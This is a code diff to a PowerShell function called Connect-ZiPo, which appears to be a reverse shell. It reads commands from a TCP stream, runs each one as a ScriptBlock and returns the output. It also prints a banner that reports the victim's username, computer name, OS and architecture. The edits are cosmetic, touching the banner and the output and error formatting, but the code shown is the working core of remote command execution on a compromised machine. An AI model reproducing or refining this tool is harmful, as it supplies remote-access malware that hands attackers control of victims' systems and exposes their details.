@@ -23,22 +23,25 @@ function Connect-ZiPo {
             $stream = $tcp.GetStream()
             [byte[]]$buffer = 0..65535 | % { 0 }
 
-            # Очистка и баннер
+            # ANSI-цвета и баннер
             $esc = [char]27
             $clear = "$esc[2J$esc[H"
             $banner = @"
 ${esc}[31m
-    ________  .__              __________                .___           
-    \______ \ |__| ____ ___.__. \______   \_______  ____ |__| ____  ____ 
-     |    |  \|  |/    <   |  |  |     ___/\_  __ \/  _ \|  |/ ___\/ __ \
-     |    `   \  |   |  \___  |  |    |     |  | \(  <_> )  \  \__\  ___/
-    /_______  /__|___|  / ____|  |____|     |__|   \____/|__|\___  >___  >
-            \/        \/\/                                      \/    \/ 
-${esc}[32m
-[+] ZiPo Connected :: $env:USERNAME@$env:COMPUTERNAME
+  __/\\\\\\\\\\\\\\\_____/\\\\\\\\\\\\\\\______/\\\\\\\\\\\\\\\___        
+   _\/\\\///////////____\/\\\///////////_____/\\\///////////__         
+    _\/\\\_______________\/\\\_______________\//\\\______        
+     _\/\\\\\\\\\\\_______\/\\\\\\\\\\\________\////\\\______      
+      _\/\\\///////________\/\\\///////____________\////\\\____       
+       _\/\\\_______________\/\\\_____________________\////\\\__      
+        _\/\\\_______________\/\\\______________/\\\______\//\\\_     
+         _\/\\\_______________\/\\\\\\\\\\\\\\\_\///\\\\\\\\\\\/__    
+          _\///________________\///////////////____\///////////____${esc}[0m
+
+${esc}[32m[+] ZiPo Connected :: $env:USERNAME@$env:COMPUTERNAME
 OS: $([System.Environment]::OSVersion.VersionString)
-Architecture: $env:PROCESSOR_ARCHITECTURE
----------------------------------------------------${esc}[0m
+Architecture: $env:PROCESSOR_ARCHITECTURE${esc}[0m
+------------------------------------------------------------
 "@
 
             $intro = $clear + $banner + "`nPS " + (Get-Location) + "> "
@@ -64,11 +67,12 @@ Architecture: $env:PROCESSOR_ARCHITECTURE
                     }
                     else {
                         $sb = [ScriptBlock]::Create($cmd)
-                        $response = & $sb 2>&1 | Out-String
+                        $output = & $sb 2>&1 | Out-String
+                        $response = $output.TrimEnd()
                     }
                 }
                 catch {
-                    $response = "[ERROR] " + ($_.Exception.Message | Out-String)
+                    $response = "[ERROR] $($_.Exception.Message)"
                 }
 
                 $response += "`nPS " + (Get-Location) + "> "
